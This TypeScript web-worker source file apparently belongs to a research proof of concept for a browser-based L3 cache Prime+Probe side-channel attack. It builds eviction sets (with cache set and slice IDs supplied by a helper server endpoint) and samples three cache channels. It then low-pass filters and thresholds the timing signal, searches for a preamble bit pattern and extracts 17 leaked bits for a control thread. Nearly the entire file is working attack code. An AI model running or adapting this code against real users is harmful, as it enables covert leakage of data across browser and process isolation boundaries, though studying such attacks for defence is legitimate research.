import { apply } from './utils';
import { PrimeProbe } from './prime_probe';
import { Signal } from './signal';
import { CACHE_SET_BITS } from './config';
import { extract, find } from './find';

async function getSource(l3: PrimeProbe, channel: number) {
    // Cheat and have the server find the correct cache set and slice for us to use
    const result = await fetch(`/addr/${channel}`, {
        headers: { 'Content-Type': 'application/json' },
    });
    const { set, slice } = await result.json();
    const id = (slice << CACHE_SET_BITS) | set;

    // Find the eviction set that maps to the desired cache set and slice
    const source = await l3.findById(id);
    if (source === null) {
        throw new Error('Could not find eviction set: bad configuration parameters?');
    }

    source.config.slotLength = slotLength;

    return source;
}

// Configuration
const slotLength = 1000;
let first = true;

async function attack() {
    const l3 = await PrimeProbe.setup();
    await l3.config.timer.start();

    const sources = await Promise.all([0, 1, 2].map(channel => getSource(l3, channel)));

    // Inform control thread that we are ready
    self.postMessage({
        type: "ready",
    }, undefined as any);

    let mode = 'capture';
    let cutoff = 25;
    let threshold = 200;
    let samples = 25000;

    // Control thread will send us a message each time it wants a sample to be captured
    self.onmessage = async function (data: any) {
        switch (data.data.type) {
            case 'sample': {
                const { x, y, color } = data.data;
                const source = sources[color];
                source.config.sampleCount = samples;

                let iteration = 0;

                let signal: Signal<unknown> | undefined = undefined;
                let output: Array<number>;

                while (true) {
                    iteration++;
                    const data = await source.getData();
                    
                    signal = await apply(data,
                        Signal.exclude({ min: 0, max: 1000 }),
                        Signal.lowpass({ cutoffFrequency: cutoff, sampleRate: 1000 }),
                        Signal.threshold({ cutoff: threshold }),
                    ) as Signal<unknown>;

                    const matches = find(Signal.fromString('101011101010001'), signal);

                    if (matches.length > 0) {
                        output = extract({ bits: 17 }, matches[0]);
                        break;
                    }
                    if (mode === 'capture') {
                        break;
                    }
                }

                // Inform control thread of the result
                self.postMessage({
                    type: "result",
                    attempts: iteration,
                    signal: Signal.serialize(signal),
                    data: output!,
                }, undefined as any);
                first = false;
                break;
            }

            case 'update': {
                mode = data.data.mode;
                cutoff = data.data.cutoff;
                threshold = data.data.threshold;
                samples = data.data.samples;
                break;
            }
        }
    }
};

attack();